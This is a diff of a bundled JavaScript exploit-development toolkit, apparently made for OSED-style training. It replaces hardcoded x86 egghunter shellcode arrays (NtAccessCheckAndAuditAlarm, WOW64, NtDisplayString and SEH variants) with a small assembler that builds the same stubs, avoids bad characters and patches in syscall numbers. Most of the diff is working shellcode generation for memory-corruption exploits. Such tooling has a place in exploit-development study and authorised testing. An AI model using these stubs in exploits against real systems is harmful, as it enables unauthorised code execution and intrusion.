@@ -2600,290 +2600,244 @@ var osed_bundle = (() => {
       warning: `${reason}; using ${hex(fallbackNumber)} (${fallback.label}). Pass os (${known}) or syscall, or read the number with u ntdll!${SERVICE_NAME[kind]} L1.`
     };
   }
-  var NTACCESS_X86 = [
-    102,
-    129,
-    202,
-    255,
-    15,
-    // or dx, 0x0fff
-    66,
-    // inc edx
-    82,
-    // push edx
-    184,
-    201,
-    1,
-    0,
-    0,
-    // mov eax, 0x1C9
-    205,
-    46,
-    // int 0x2e
-    60,
-    5,
-    // cmp al, 0x5
-    90,
-    // pop edx
-    116,
-    237,
-    // je short (back to or dx)
-    184,
-    84,
-    48,
-    48,
-    87,
-    // mov eax, <TAG>
-    139,
-    250,
-    // mov edi, edx
-    175,
-    // scasd
-    117,
-    232,
-    // jne short (back to inc edx)
-    175,
-    // scasd
-    117,
-    229,
-    // jne short (back to inc edx)
-    255,
-    231
-    // jmp edi
-  ];
-  var NTACCESS_WOW64 = [
-    51,
-    219,
-    // xor ebx, ebx
-    83,
-    83,
-    83,
-    83,
-    83,
-    // push ebx x10 (zeroed arguments 2-11)
-    83,
-    83,
-    83,
-    83,
-    83,
-    179,
-    192,
-    // mov bl, 0xc0
-    102,
-    129,
-    202,
-    255,
-    15,
-    // or dx, 0x0fff
-    66,
-    // inc edx
-    82,
-    // push edx (SubsystemName = probed address)
-    82,
-    // push edx (return-address slot)
-    184,
-    41,
-    0,
-    0,
-    0,
-    // mov eax, 0x29
-    100,
-    255,
-    19,
-    // call dword ptr fs:[ebx]
-    90,
-    // pop edx
-    90,
-    // pop edx
-    60,
-    5,
-    // cmp al, 0x5
-    116,
-    234,
-    // je short (back to or dx)
-    184,
-    84,
-    48,
-    48,
-    87,
-    // mov eax, <TAG>
-    139,
-    250,
-    // mov edi, edx
-    175,
-    // scasd
-    117,
-    229,
-    // jne short (back to inc edx)
-    175,
-    // scasd
-    117,
-    226,
-    // jne short (back to inc edx)
-    255,
-    231
-    // jmp edi
-  ];
-  var NTDISPLAY_X86 = [
-    102,
-    129,
-    202,
-    255,
-    15,
-    // or dx, 0x0fff
-    66,
-    // inc edx
-    82,
-    // push edx
-    106,
-    67,
-    // push 0x43  (NtDisplayString syscall)
-    88,
-    // pop eax
-    205,
-    46,
-    // int 0x2e
-    60,
-    5,
-    // cmp al, 0x5
-    90,
-    // pop edx
-    116,
-    239,
-    // je short (back to or dx)
-    184,
-    84,
-    48,
-    48,
-    87,
-    // mov eax, <TAG>
-    139,
-    250,
-    // mov edi, edx
-    175,
-    // scasd
-    117,
-    234,
-    // jne short (back to inc edx)
-    175,
-    // scasd
-    117,
-    231,
-    // jne short (back to inc edx)
-    255,
-    231
-    // jmp edi
-  ];
-  var TAG_OFFSET_NTDISPLAY = 18;
-  var SYSCALL_OFFSET_NTDISPLAY = 8;
-  var SEH_EGGHUNTER = [
-    // jmp short install_seh
-    235,
-    23,
-    // handler (offset 0x02, 23 bytes)
-    139,
-    76,
-    36,
-    12,
-    // mov ecx, [esp+0x0C]      (ContextRecord)
-    139,
-    68,
-    36,
-    8,
-    // mov eax, [esp+0x08]      (EstablisherFrame)
-    139,
-    64,
-    4,
-    // mov eax, [eax+0x04]      (handler address)
-    131,
-    192,
-    43,
-    // add eax, 0x2B            (scan_loop = handler+43)
-    137,
-    129,
-    184,
-    0,
-    0,
-    0,
-    // mov [ecx+0xB8], eax     (set Eip = scan_loop)
-    49,
-    192,
-    // xor eax, eax             (EXCEPTION_CONTINUE_EXECUTION)
-    195,
-    // ret
-    // install_seh (offset 0x19)
-    49,
-    210,
-    // xor edx, edx
-    232,
-    0,
-    0,
-    0,
-    0,
-    // call $+5
-    94,
-    // pop esi                  (esi = addr of this pop)
-    131,
-    238,
-    30,
-    // sub esi, 0x1E            (esi = handler addr)
-    86,
-    // push esi                 (handler)
-    100,
-    255,
-    50,
-    // push dword ptr fs:[edx]  (old SEH)
-    100,
-    137,
-    34,
-    // mov dword ptr fs:[edx], esp
-    49,
-    255,
-    // xor edi, edi             (scan from 0)
-    // scan_loop (offset 0x2D) — handler resumes here (next page)
-    102,
-    129,
-    207,
-    255,
-    15,
-    // or di, 0x0FFF
-    // next_addr (offset 0x32) — jnz resumes here (next dword)
-    71,
-    // inc edi
-    184,
-    84,
-    48,
-    48,
-    87,
-    // mov eax, <TAG>           (tag at offset 0x34)
-    175,
-    // scasd
-    117,
-    247,
-    // jnz next_addr            (0x32)
-    175,
-    // scasd
-    117,
-    244,
-    // jnz next_addr            (0x32)
-    // found — restore old SEH and jump
-    100,
-    143,
-    2,
-    // pop dword ptr fs:[edx]
-    131,
-    196,
-    4,
-    // add esp, 0x04
-    255,
-    231
-    // jmp edi
-  ];
-  var TAG_OFFSET_NTACCESS = 20;
-  var TAG_OFFSET_NTACCESS_WOW64 = 37;
-  var TAG_OFFSET_SEH = 52;
-  var SYSCALL_OFFSET_NTACCESS = 8;
-  var SYSCALL_OFFSET_NTACCESS_WOW64 = 23;
+  function asmSize(item) {
+    if (Array.isArray(item)) return item.length;
+    if ("label" in item) return 0;
+    if ("jcc" in item) return 2;
+    if ("call" in item) return 5;
+    return 1;
+  }
+  function assemble(items) {
+    const labels = /* @__PURE__ */ new Map();
+    let offset = 0;
+    for (const item of items) {
+      if (!Array.isArray(item) && "label" in item) labels.set(item.label, offset);
+      offset += asmSize(item);
+    }
+    const at = (name) => {
+      const value = labels.get(name);
+      if (value === void 0) throw new Error(`egghunter stub has no label ${name}`);
+      return value;
+    };
+    const bytes = [];
+    for (const item of items) {
+      const next = bytes.length + asmSize(item);
+      if (Array.isArray(item)) {
+        bytes.push(...item);
+      } else if ("jcc" in item) {
+        const rel = at(item.to) - next;
+        if (rel < -128 || rel > 127) throw new Error(`short jump to ${item.to} out of range (${rel})`);
+        bytes.push(item.jcc, rel & 255);
+      } else if ("call" in item) {
+        bytes.push(232, ...dwordLE(at(item.call) - next));
+      } else if ("gap" in item) {
+        const gap = at(item.gap[1]) - at(item.gap[0]);
+        if (gap < 1 || gap > 127) throw new Error(`gap ${item.gap.join("-")} does not fit imm8 (${gap})`);
+        bytes.push(gap);
+      }
+    }
+    return bytes;
+  }
+  function movEaxCandidates(value) {
+    const v = value >>> 0;
+    const lo = v & 255;
+    const hi = v >>> 8 & 255;
+    const candidates2 = [];
+    if (v === 0) candidates2.push([49, 192]);
+    else if (v <= 127) candidates2.push([106, v, 88]);
+    else if (v <= 255) candidates2.push([49, 192, 176, v]);
+    else if (v <= 65535 && lo === 0) candidates2.push([49, 192, 180, hi]);
+    else if (v <= 65535) candidates2.push([49, 192, 102, 184, lo, hi]);
+    candidates2.push([184, ...dwordLE(v)]);
+    candidates2.push([184, ...dwordLE(~v >>> 0), 247, 208]);
+    return candidates2;
+  }
+  function movEax(value, badSet) {
+    var _a;
+    const candidates2 = movEaxCandidates(value);
+    return (_a = candidates2.find((c) => c.every((b) => b !== 0 && !badSet.has(b)))) != null ? _a : candidates2[0];
+  }
+  function ntaccessX86(tag, mov) {
+    return [
+      { label: "page" },
+      [102, 129, 202, 255, 15],
+      // or dx, 0x0fff
+      { label: "addr" },
+      [66],
+      // inc edx
+      [82],
+      // push edx
+      mov,
+      // eax = syscall number
+      [205, 46],
+      // int 0x2e
+      [60, 5],
+      // cmp al, 0x5
+      [90],
+      // pop edx
+      { jcc: 116, to: "page" },
+      // je page
+      [184, ...tag],
+      // mov eax, <TAG>
+      [139, 250],
+      // mov edi, edx
+      [175],
+      // scasd
+      { jcc: 117, to: "addr" },
+      // jne addr
+      [175],
+      // scasd
+      { jcc: 117, to: "addr" },
+      // jne addr
+      [255, 231]
+      // jmp edi
+    ];
+  }
+  function ntaccessWow64(tag, mov) {
+    return [
+      [51, 219],
+      // xor ebx, ebx
+      [83, 83, 83, 83, 83],
+      // push ebx x10 (zeroed arguments 2-11)
+      [83, 83, 83, 83, 83],
+      [179, 192],
+      // mov bl, 0xc0
+      { label: "page" },
+      [102, 129, 202, 255, 15],
+      // or dx, 0x0fff
+      { label: "addr" },
+      [66],
+      // inc edx
+      [82],
+      // push edx (SubsystemName = probed address)
+      [82],
+      // push edx (return-address slot)
+      mov,
+      // eax = syscall number
+      [100, 255, 19],
+      // call dword ptr fs:[ebx]
+      [90],
+      // pop edx
+      [90],
+      // pop edx
+      [60, 5],
+      // cmp al, 0x5
+      { jcc: 116, to: "page" },
+      // je page
+      [184, ...tag],
+      // mov eax, <TAG>
+      [139, 250],
+      // mov edi, edx
+      [175],
+      // scasd
+      { jcc: 117, to: "addr" },
+      // jne addr
+      [175],
+      // scasd
+      { jcc: 117, to: "addr" },
+      // jne addr
+      [255, 231]
+      // jmp edi
+    ];
+  }
+  function ntdisplayX86(tag, syscall) {
+    return [
+      { label: "page" },
+      [102, 129, 202, 255, 15],
+      // or dx, 0x0fff
+      { label: "addr" },
+      [66],
+      // inc edx
+      [82],
+      // push edx
+      [106, syscall, 88],
+      // push imm8 ; pop eax
+      [205, 46],
+      // int 0x2e
+      [60, 5],
+      // cmp al, 0x5
+      [90],
+      // pop edx
+      { jcc: 116, to: "page" },
+      // je page
+      [184, ...tag],
+      // mov eax, <TAG>
+      [139, 250],
+      // mov edi, edx
+      [175],
+      // scasd
+      { jcc: 117, to: "addr" },
+      // jne addr
+      [175],
+      // scasd
+      { jcc: 117, to: "addr" },
+      // jne addr
+      [255, 231]
+      // jmp edi
+    ];
+  }
+  function sehX86(tag) {
+    return [
+      { jcc: 235, to: "getpc" },
+      // jmp short getpc
+      { label: "install" },
+      [94],
+      // pop esi (handler)
+      [49, 210],
+      // xor edx, edx
+      [86],
+      // push esi (Handler)
+      [100, 255, 50],
+      // push dword ptr fs:[edx] (Next = old SEH)
+      [100, 137, 34],
+      // mov dword ptr fs:[edx], esp
+      [49, 255],
+      // xor edi, edi (scan from 0)
+      { label: "page" },
+      [102, 129, 207, 255, 15],
+      // or di, 0x0fff (the handler resumes here)
+      { label: "addr" },
+      [71],
+      // inc edi
+      [184, ...tag],
+      // mov eax, <TAG>
+      [175],
+      // scasd
+      { jcc: 117, to: "addr" },
+      // jnz addr
+      [175],
+      // scasd
+      { jcc: 117, to: "addr" },
+      // jnz addr
+      [100, 143, 2],
+      // pop dword ptr fs:[edx] (restore old SEH)
+      [131, 196, 4],
+      // add esp, 4
+      [255, 231],
+      // jmp edi
+      { label: "getpc" },
+      { call: "install" },
+      // call install (pushes the handler address)
+      { label: "handler" },
+      [139, 76, 36, 12],
+      // mov ecx, [esp+0xc] (ContextRecord)
+      [139, 68, 36, 8],
+      // mov eax, [esp+0x8] (EstablisherFrame)
+      [139, 64, 4],
+      // mov eax, [eax+0x4] (Handler)
+      [131, 232],
+      { gap: ["page", "handler"] },
+      // sub eax, handler - page
+      [131, 193, 127],
+      // add ecx, 0x7f
+      [137, 65, 57],
+      // mov [ecx+0x39], eax (CONTEXT.Eip = page)
+      [49, 192],
+      // xor eax, eax (ExceptionContinueExecution)
+      [195]
+      // ret
+    ];
+  }
   function uniqueBytes(values) {
     const seen = /* @__PURE__ */ new Set();
     for (const v of values != null ? values : []) {
@@ -2910,54 +2864,36 @@ var osed_bundle = (() => {
     var _a, _b, _c;
     const tag = tagBytes(options.tag);
     const badSet = new Set(uniqueBytes(options.badchars));
-    let template;
-    let tagOffset;
-    let syscallOffset = null;
-    let kind = null;
+    let items;
     let label;
+    let resolved = null;
     if (options.mode === "seh") {
-      template = [...SEH_EGGHUNTER];
-      tagOffset = TAG_OFFSET_SEH;
+      items = sehX86(tag);
       label = "seh egghunter";
     } else if (options.mode === "ntdisplay") {
       if (options.wow64) {
         throw new Error('ntdisplay has no WOW64 stub: int 0x2e raises STATUS_ILLEGAL_INSTRUCTION in a WOW64 process. Use mode "ntaccess" with wow64 = true.');
       }
-      template = [...NTDISPLAY_X86];
-      tagOffset = TAG_OFFSET_NTDISPLAY;
-      syscallOffset = SYSCALL_OFFSET_NTDISPLAY;
-      kind = "ntdisplay32";
+      resolved = resolveSyscall("ntdisplay32", options.os, options.syscall);
+      if (resolved.number < 1 || resolved.number > 127) {
+        throw new Error(`NtDisplayString number ${hex(resolved.number)} (${resolved.source}) does not fit the push imm8 in the ntdisplay stub (0x01-0x7F). Use mode "ntaccess".`);
+      }
+      items = ntdisplayX86(tag, resolved.number);
       label = "ntdisplay egghunter";
     } else if (options.wow64) {
-      template = [...NTACCESS_WOW64];
-      tagOffset = TAG_OFFSET_NTACCESS_WOW64;
-      syscallOffset = SYSCALL_OFFSET_NTACCESS_WOW64;
-      kind = "ntaccess64";
+      resolved = resolveSyscall("ntaccess64", options.os, options.syscall);
+      items = ntaccessWow64(tag, movEax(resolved.number, badSet));
       label = "ntaccess wow64 egghunter";
     } else {
-      template = [...NTACCESS_X86];
-      tagOffset = TAG_OFFSET_NTACCESS;
-      syscallOffset = SYSCALL_OFFSET_NTACCESS;
-      kind = "ntaccess32";
+      resolved = resolveSyscall("ntaccess32", options.os, options.syscall);
+      items = ntaccessX86(tag, movEax(resolved.number, badSet));
       label = "ntaccess egghunter";
     }
-    template.splice(tagOffset, 4, ...tag);
-    let resolved = null;
-    if (syscallOffset !== null && kind !== null) {
-      resolved = resolveSyscall(kind, options.os, options.syscall);
-      if (kind === "ntdisplay32") {
-        if (resolved.number < 1 || resolved.number > 127) {
-          throw new Error(`NtDisplayString number ${hex(resolved.number)} (${resolved.source}) does not fit the push imm8 in the ntdisplay stub (0x01-0x7F). Use mode "ntaccess".`);
-        }
-        template.splice(syscallOffset, 1, resolved.number);
-      } else {
-        template.splice(syscallOffset, 4, ...dwordLE(resolved.number));
-      }
-    }
-    const badcharHits3 = checkBadchars(template, label, badSet);
+    const bytes = assemble(items);
+    const badcharHits3 = checkBadchars(bytes, label, badSet);
     return {
-      bytes: template,
-      size: template.length,
+      bytes,
+      size: bytes.length,
       badcharHits: badcharHits3,
       syscallUsed: (_a = resolved == null ? void 0 : resolved.number) != null ? _a : null,
       syscallSource: (_b = resolved == null ? void 0 : resolved.source) != null ? _b : null,
@@ -11351,10 +11287,10 @@ var osed_bundle = (() => {
         value = true ? "1.0.4" : globalThis[key2];
         break;
       case "__OSED_BUILD_TIME__":
-        value = true ? "2026-11-19T10:49:13.760Z" : globalThis[key2];
+        value = true ? "2026-11-19T11:01:43.708Z" : globalThis[key2];
         break;
       case "__OSED_GIT_COMMIT__":
-        value = true ? "bc6023a41b25" : globalThis[key2];
+        value = true ? "1f020e500cc2" : globalThis[key2];
         break;
     }
     return typeof value === "string" && value.length > 0 ? value : fallback;
